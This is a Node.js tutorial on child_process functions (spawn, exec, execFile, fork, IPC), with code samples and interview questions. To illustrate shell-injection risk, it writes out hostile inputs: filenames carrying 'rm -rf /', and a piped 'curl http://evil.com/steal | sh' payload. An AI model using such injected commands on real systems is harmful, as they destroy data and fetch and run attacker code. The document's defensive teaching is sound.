---
title: "spawn, exec, fork & IPC"
outline: deep
---

# spawn, exec, fork & IPC

**Interview weight:** 🔥🔥🔥 | **Node 22+** | Prerequisites: [Process Lifecycle](/nodejs/module-01/02-process-lifecycle), [FS API](./01-fs-api)

## 🗣️ In Plain English

::: tip In Plain English
Imagine you are a manager in an office. Normally you do everything yourself at your desk — you are the Node.js event loop. But sometimes you need someone else to handle a task: run a shell script, convert a video, or crunch numbers in a separate program.

You have four ways to delegate:

**spawn** is hiring a contractor and communicating through a mail slot. You tell them exactly what program to run and pass arguments. Their output comes back through the slot as a continuous stream — you can read it line by line as they work. You do not wait for them to finish before doing other things.

**exec** is sending a task to an assistant and waiting for them to come back with the complete answer written on a single piece of paper. Convenient for quick tasks, but if the answer is a 500-page document, they cannot carry it — the paper has a size limit (the buffer). Also, because you hand the task as a single sentence ("run this command in a shell"), a sneaky person could slip extra instructions into your sentence (shell injection).

**execFile** is like exec but you walk to the contractor's desk directly instead of going through a receptionist (the shell). No receptionist means no risk of someone sneaking extra instructions. Slightly faster, slightly safer.

**fork** is the special case: you clone yourself. The clone is another Node.js process running a JavaScript file you specify. You and your clone have a direct phone line (IPC channel) — you can call each other any time to pass structured messages back and forth. This is how `cluster` works internally, and how you run CPU-intensive Node code in a separate process without blocking your main loop.
:::

## ⚙️ Under the Hood

### The Four Functions

All four live in `node:child_process`. They all create a new OS process via `fork(2)` + `execve(2)` on POSIX (or `CreateProcess` on Windows).

| Function | Shell? | Output | IPC? | Best for |
|---|---|---|---|---|
| `spawn(cmd, args)` | No (by default) | Streams (`stdout`, `stderr`) | Optional | Long-running processes, large output |
| `exec(cmd)` | Yes (`/bin/sh -c`) | Buffered string/Buffer (default 1 MB max) | No | Short shell commands |
| `execFile(file, args)` | No | Buffered string/Buffer | No | Like `exec` but no shell — safer, faster |
| `fork(modulePath)` | No | Streams + **built-in IPC channel** | Yes | Node-to-Node communication |

### spawn — The Foundation

`spawn` is the primitive. `exec`, `execFile`, and `fork` are all built on top of it.

```typescript
// run: node --experimental-strip-types spawn-demo.ts
import { spawn } from 'node:child_process';

// Spawn `ls -la /tmp` — no shell involved
const child = spawn('ls', ['-la', '/tmp']);

// stdout and stderr are Readable streams
child.stdout.on('data', (chunk: Buffer) => {
  console.log(`STDOUT: ${chunk.toString()}`);
});

child.stderr.on('data', (chunk: Buffer) => {
  console.error(`STDERR: ${chunk.toString()}`);
});

child.on('close', (code: number | null, signal: string | null) => {
  console.log(`Process exited: code=${code}, signal=${signal}`);
});

child.on('error', (err: Error) => {
  // Fired if the process cannot be spawned (e.g., command not found)
  console.error('Failed to start:', err.message);
});
```

### stdio Configuration

The `stdio` option controls how the child's standard streams connect to the parent:

```typescript
// run: node --experimental-strip-types stdio-config.ts
import { spawn } from 'node:child_process';

// 'pipe' (default) — parent gets readable/writable streams
const piped = spawn('echo', ['hello'], { stdio: 'pipe' });
piped.stdout!.pipe(process.stdout);

// 'inherit' — child shares parent's stdin/stdout/stderr directly
// Useful for interactive programs or when you want output to go straight to terminal
spawn('ls', ['-la', '.'], { stdio: 'inherit' });

// 'ignore' — /dev/null — child's output is discarded
const quiet = spawn('ls', ['/'], { stdio: 'ignore' });
quiet.on('close', (code) => console.log(`Quiet exit: ${code}`));

// Fine-grained: [stdin, stdout, stderr]
// stdin: pipe (parent can write), stdout: inherit, stderr: pipe (parent reads errors)
const custom = spawn('cat', [], { stdio: ['pipe', 'inherit', 'pipe'] });
custom.stdin!.write('hello from parent\n');
custom.stdin!.end();
```

### exec — Buffered, Shell-Based

```typescript
// run: node --experimental-strip-types exec-demo.ts
import { exec } from 'node:child_process';

// exec runs the command in /bin/sh -c "..." (or cmd.exe on Windows)
exec('echo "hello" && ls /tmp | head -5', (err, stdout, stderr) => {
  if (err) {
    console.error(`Error (code ${err.code}): ${stderr}`);
    return;
  }
  console.log(stdout);
});

// Promise wrapper (built-in since Node 10)
import { promisify } from 'node:util';
const execAsync = promisify(exec);

async function run(): Promise<void> {
  const { stdout } = await execAsync('uname -a', {
    maxBuffer: 10 * 1024 * 1024, // increase from default 1 MB if needed
  });
  console.log(`System: ${stdout.trim()}`);
}

run();
```

### Shell Injection with exec

**This is a real security vulnerability.** Because `exec` passes the command string to a shell, user input can inject arbitrary commands:

```typescript
// DANGEROUS — never do this
import { exec } from 'node:child_process';

const userInput = 'file.txt; rm -rf /'; // malicious input
exec(`cat ${userInput}`);
// Shell interprets: cat file.txt; rm -rf /
// The semicolon starts a new command!

// SAFE — use execFile or spawn (no shell interpretation)
import { execFile } from 'node:child_process';
execFile('cat', [userInput]); // treated as a single filename argument, fails safely
```

**Rule:** If the command includes user-supplied values, **never use `exec`.** Use `spawn` or `execFile` which pass arguments as an array, not a shell string.

### execFile — No Shell, Buffered

```typescript
// run: node --experimental-strip-types execfile-demo.ts
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);

async function getNodeVersion(): Promise<void> {
  // No shell — executes the binary directly with args
  const { stdout } = await execFileAsync('node', ['--version']);
  console.log(`Node version: ${stdout.trim()}`);
}

getNodeVersion();
```

### fork — Node-to-Node with IPC

`fork` creates a new Node.js process running a specified module. It automatically sets up an **IPC channel** — a bidirectional communication pipe using OS-level mechanisms (Unix domain sockets on POSIX, named pipes on Windows).

```typescript
// run: node --experimental-strip-types fork-parent.ts
// Parent process
import { fork } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const currentDir = dirname(fileURLToPath(import.meta.url));
const childScript = join(currentDir, 'fork-child.ts');

const child = fork(childScript, [], {
  // fork uses execArgv to pass Node flags to the child
  execArgv: ['--experimental-strip-types'],
});

// Send a message to the child via IPC
child.send({ task: 'compute', data: [1, 2, 3, 4, 5] });

// Receive messages from the child
child.on('message', (msg: unknown) => {
  console.log('Parent received:', msg);
  child.disconnect(); // close the IPC channel
});

child.on('exit', (code) => {
  console.log(`Child exited with code ${code}`);
});
```

```typescript
// fork-child.ts — the child process
// run: (this file is started by fork-parent.ts, not run directly)

interface TaskMessage {
  task: string;
  data: number[];
}

process.on('message', (msg: TaskMessage) => {
  if (msg.task === 'compute') {
    const sum = msg.data.reduce((a, b) => a + b, 0);
    process.send!({ result: sum });
  }
});
```

### IPC Message Passing Mechanics

Messages sent via `child.send()` / `process.send()` are serialized using V8's structured clone algorithm (same as `postMessage` in workers). This means:

- Supported types: primitives, plain objects, arrays, Date, RegExp, Map, Set, ArrayBuffer, TypedArrays, Error
- **Not supported:** functions, symbols, WeakMap/WeakSet, DOM objects
- Large messages are expensive — serialization + deserialization + pipe I/O

You can also send **socket handles** over IPC — this is how `cluster` distributes incoming connections:

```typescript
// Conceptually (cluster internals):
// Primary: child.send('handle', socket);
// Worker: process.on('message', (msg, socket) => { ... });
```

### child.kill() and Signals

```typescript
// run: node --experimental-strip-types kill-demo.ts
import { spawn } from 'node:child_process';

const child = spawn('sleep', ['60']);

console.log(`Child PID: ${child.pid}`);

setTimeout(() => {
  // Send SIGTERM (default) — polite request to terminate
  child.kill(); // same as child.kill('SIGTERM')

  // If the process ignores SIGTERM, escalate:
  setTimeout(() => {
    if (!child.killed) {
      child.kill('SIGKILL'); // cannot be caught or ignored
    }
  }, 5000);
}, 1000);

child.on('close', (code, signal) => {
  console.log(`Child closed: code=${code}, signal=${signal}`);
  // signal will be 'SIGTERM' if the kill worked
});
```

**Important:** `child.kill()` sends a signal to the child process, but the child may catch `SIGTERM` and delay exit. `child.killed` only means the signal was sent, not that the process has exited. Always listen for `'close'` or `'exit'` to confirm termination.

### Streaming Large Output with spawn

`exec` buffers all output in memory (default limit: 1 MB via `maxBuffer`). For large outputs, use `spawn` and process the stream:

```typescript
// run: node --experimental-strip-types stream-output.ts
import { spawn } from 'node:child_process';
import { createInterface } from 'node:readline';

// Find all .ts files — could produce a lot of output
const child = spawn('find', ['.', '-name', '*.ts', '-type', 'f']);

const rl = createInterface({ input: child.stdout! });

let count = 0;
rl.on('line', (line: string) => {
  count++;
  if (count <= 5) console.log(`File: ${line}`);
});

child.on('close', (code) => {
  console.log(`Found ${count} TypeScript files (exit code: ${code})`);
});
```

### AbortController Integration (Node 16+)

```typescript
// run: node --experimental-strip-types abort-child.ts
import { spawn } from 'node:child_process';

const controller = new AbortController();
const { signal } = controller;

const child = spawn('sleep', ['30'], { signal });

child.on('error', (err: Error) => {
  if (err.name === 'AbortError') {
    console.log('Child process was aborted');
  }
});

// Abort after 1 second — sends SIGTERM to the child
setTimeout(() => controller.abort(), 1000);
```

### Detached Processes

Sometimes you need a child process to outlive the parent:

```typescript
// run: node --experimental-strip-types detached.ts
import { spawn } from 'node:child_process';

const child = spawn('sleep', ['300'], {
  detached: true,    // child gets its own process group
  stdio: 'ignore',   // detach stdio from parent
});

child.unref(); // allow parent to exit without waiting for child

console.log(`Spawned detached process PID ${child.pid}`);
// Parent exits immediately; child keeps running
```

## 💥 Where It Bites (Production Lens)

::: warning Where It Bites

**1. Shell injection via exec with user input.**
Symptom: an attacker passes `; curl http://evil.com/steal | sh` as a filename and your server executes arbitrary commands. This is a critical RCE (remote code execution) vulnerability. Root cause: using `exec` with string interpolation. Fix: never pass user input into `exec`. Use `spawn` or `execFile` with arguments as an array. If you must use a shell, rigorously validate and escape inputs — but prefer to avoid the shell entirely.

**2. maxBuffer overflow with exec.**
Symptom: `Error: maxBuffer length exceeded` when running a command that produces more output than expected (e.g., `git log` without `--max-count`). The default `maxBuffer` is 1 MB (1024 * 1024 bytes). Fix: either increase `maxBuffer` or — better — switch to `spawn` and process the output as a stream. Stream processing uses constant memory regardless of output size.

**3. Zombie processes from unhandled child exits.**
Symptom: over time, `ps aux` shows hundreds of defunct/zombie processes. Cause: spawning child processes without listening for `'close'` or `'exit'` events. The OS keeps the process table entry until the parent reads the exit status. Fix: always attach exit handlers. In a long-running server, track all spawned children and ensure cleanup. Use `child.unref()` only for intentionally detached processes.

**4. fork IPC channel keeps parent alive.**
Symptom: your application hangs on shutdown — `process.exit()` is never reached. The IPC channel created by `fork` is a reference that keeps the parent's event loop alive. Even if the child has finished its work, an open IPC channel prevents the parent from exiting naturally. Fix: call `child.disconnect()` when IPC communication is complete, or `child.unref()` if you do not need to wait for the child.
:::

## 🎯 Checkpoint

::: details Question 1 — spawn vs exec security
**Q:** A developer writes `exec(\`convert \${userFilePath} output.png\`)` to convert user-uploaded images. Explain the vulnerability and the correct fix.

**A:** The `exec` function passes the entire command string to `/bin/sh -c`, which interprets shell metacharacters. If `userFilePath` is `image.jpg; rm -rf /`, the shell executes `convert image.jpg` followed by `rm -rf /`. This is a **command injection** (RCE) vulnerability. The fix is to use `execFile('convert', [userFilePath, 'output.png'])` or `spawn('convert', [userFilePath, 'output.png'])`. Both pass `userFilePath` as a single argument directly to the `execve` syscall — the OS treats it as a literal string, not a shell expression. No shell metacharacter (`; | & $() \`\``) has special meaning because no shell is involved.
:::

::: details Question 2 — fork IPC serialization
**Q:** You `fork` a worker and send a message containing a 50 MB Buffer via `child.send(buffer)`. What happens to memory, and how would you optimize it?

**A:** `child.send()` uses V8 structured clone serialization. The 50 MB Buffer is serialized in the parent process (creating a temporary copy), written to the IPC pipe (Unix domain socket), then deserialized in the child process (creating another copy). Peak memory usage: ~150 MB (original + serialized + deserialized). The IPC pipe also has kernel buffer limits and will exert backpressure. **Optimizations:** (1) Write the buffer to a temporary file (or shared memory via `/dev/shm`) and send only the file path over IPC — the child reads the file directly. (2) Use `worker_threads` instead of `fork` — workers support `SharedArrayBuffer` for zero-copy sharing and `ArrayBuffer` transfer (ownership moves with zero copy). (3) If the data is streamable, pipe it through the child's stdin/stdout instead of IPC.
:::

::: details Question 3 — When fork over worker_threads
**Q:** When would you choose `fork` over `worker_threads` for CPU-intensive work? Name two concrete scenarios.

**A:** (1) **Isolation from crashes:** A bug in worker_threads code (especially native addons or out-of-memory conditions) can crash the entire process, taking down all workers and the main thread. A `fork`ed process crashes independently — the parent stays alive and can restart the child. For processing untrusted or unreliable code (e.g., user-submitted scripts), process-level isolation is safer. (2) **Memory independence:** Each `fork`ed process has its own V8 heap with its own `--max-old-space-size` limit. If a CPU task is also memory-intensive (e.g., building a large AST for code compilation), it can grow its heap without competing with the main process's heap or triggering GC in the main process. Worker threads share a process memory limit and a single OOM kill affects everything.
:::

## Key Mental Models

- **spawn is the foundation; exec/execFile/fork are conveniences.** Understand spawn's streaming model and everything else follows.
- **Shell = convenience + danger.** `exec` gives you pipes, globs, and redirection but opens the door to injection. Avoid the shell when processing any external input.
- **fork = spawn + IPC + Node.** It is specifically for running another Node script with a built-in message-passing channel.
- **Streams over buffers for large output.** Use `spawn` and read `stdout` as a stream rather than `exec` which buffers everything in memory.
- **IPC serializes (copies), it does not share.** For large data transfer between processes, use the filesystem or shared memory — not `child.send()`.

## Related

- [FS API Families](./01-fs-api) — filesystem operations that child processes often interact with
- [Graceful Shutdown](./03-graceful-shutdown) — properly terminating child processes during shutdown
- [Process Lifecycle](/nodejs/module-01/02-process-lifecycle) — the parent process's lifecycle that governs all child processes
